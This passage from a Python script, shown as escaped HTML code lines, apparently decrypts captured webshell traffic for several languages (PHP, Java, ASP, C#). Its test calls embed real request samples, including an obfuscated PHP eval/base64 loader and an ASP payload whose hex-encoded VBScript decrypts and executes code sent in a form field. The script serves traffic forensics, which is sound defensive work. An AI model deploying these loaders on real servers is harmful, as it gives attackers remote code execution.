decrypter.decrypt_req_payload(b&#x27;pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # exit()</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = JAVA_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # java_raw_req = &#x27;d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&#x27;</span><br><span class=\"line\">    # java_raw_res = &#x27;2c5fc8a643ef334889238c26a41b360daa0156f71b0cca70b8bee7612de7fe4e&#x27;</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(java_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(java_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = JAVA_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&#x27;pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(</span><br><span class=\"line\">        b&#x27;11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;11cd6ab2s=ac826a&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;methodName\\x02\\x04\\x00\\x00\\x00test&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;ok&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_EVAL_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=eval%28%22Ex%22%26cHr%28101%29%26%22cute%28%22%22Server.ScriptTimeout%3D3600%3AOn+Error+Resume+Next%3AFunction+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function%3AEx%22%26cHr%28101%29%26%22cute%28%22%22%22%22On+Error+Resume+Next%3A%22%22%22%22%26bd%28%22%22%22%220d0a5365742062797061737344696374696f6e617279203d205365727665722e4372656174654f626a6563742822536372697074696e672e44696374696f6e61727922290d0a0d0a46756e6374696f6e204261736536344465636f646528427956616c2076436f6465290d0a2020202044696d206f584d4c2c206f4e6f64650d0a20202020536574206f584d4c203d204372656174654f626a65637428224d73786d6c322e444f4d446f63756d656e742e332e3022290d0a20202020536574206f4e6f6465203d206f584d4c2e437265617465456c656d656e74282262617365363422290d0a202020206f4e6f64652e6461746154797065203d202262696e2e626173653634220d0a202020206f4e6f64652e74657874203d2076436f64650d0a202020204261736536344465636f6465203d206f4e6f64652e6e6f6465547970656456616c75650d0a20202020536574206f4e6f6465203d204e6f7468696e670d0a20202020536574206f584d4c203d204e6f7468696e670d0a456e642046756e6374696f6e0d0a0d0a46756e6374696f6e2064656372797074696f6e28636f6e74656e742c697342696e290d0a2020202064696d2073697a652c692c726573756c742c6b657953697a650d0a202020206b657953697a65203d206c656e286b6579290d0a202020205365742042696e61727953747265616d203d204372656174654f626a656374282241444f44422e53747265616d22290d0a2020202042696e61727953747265616d2e43686172536574203d202269736f2d383835392d31220d0a2020202042696e61727953747265616d2e54797065203d20320d0a2020202042696e61727953747265616d2e4f70656e0d0a202020206966204973417272617928636f6e74656e7429207468656e0d0a202020202020202073697a653d55426f756e6428636f6e74656e74292b310d0a2020202020202020466f7220693d3120546f2073697a650d0a20202020202020202020202042696e61727953747265616d2e57726974655465787420636872772861736362286d69646228636f6e74656e742c692c312929290d0a20202020202020204e6578740d0a20202020656e642069660d0a2020202042696e61727953747265616d2e506f736974696f6e203d20300d0a20202020696620697342696e207468656e0d0a202020202020202042696e61727953747265616d2e54797065203d20310d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e5265616428290d0a20202020656c73650d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e526561645465787428290d0a20202020656e642069660d0a0d0a456e642046756e6374696f6e0d0a20202020636f6e74656e743d726571756573742e466f726d28226b657922290d0a202020206966206e6f74204973456d70747928636f6e74656e7429207468656e0d0a0d0a2020202020202020696620204973456d7074792853657373696f6e28227061796c6f6164222929207468656e0d0a202020202020202020202020636f6e74656e743d64656372797074696f6e284261736536344465636f646528636f6e74656e74292c66616c7365290d0a20202020202020202020202053657373696f6e28227061796c6f616422293d636f6e74656e740d0a202020202020202020202020726573706f6e73652e456e640d0a2020202020202020656c73650d0a202020202020202020202020636f6e74656e743d4261736536344465636f646528636f6e74656e74290d0a20202020202020202020202062797061737344696374696f6e6172792e41646420227061796c6f6164222c53657373696f6e28227061796c6f616422290d0a202020202020202020202020457865637574652862797061737344696374696f6e61727928227061796c6f61642229290d0a202020202020202020202020726573756c743d72756e28636f6e74656e74290d0a202020202020202020202020726573706f6e73652e5772697465282238323831333022290d0a2020202020202020202020206966206e6f74204973456d70747928726573756c7429207468656e0d0a20202020202020202020202020202020726573706f6e73652e577269746520426173653634456e636f64652864656372797074696f6e28726573756c742c7472756529290d0a202020202020202020202020656e642069660d0a202020202020202020202020726573706f6e73652e5772697465282232306562626322290d0a2020202020202020656e642069660d0a20202020656e642069660d0a0d0a%22%22%22%22%29%29%3AResponse.End%22%22%29%22%29%0D%0A&amp;key=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;828130b2s=20ebbc&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;11cd6aDF0=ac826a&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    asp_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class=\"line\">    asp_xor_raw_res = &#x27;0c5d&#x27;</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(asp_xor_raw_req)))</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(asp_xor_raw_res)))</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = CSHAP_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(b&#x27;pass=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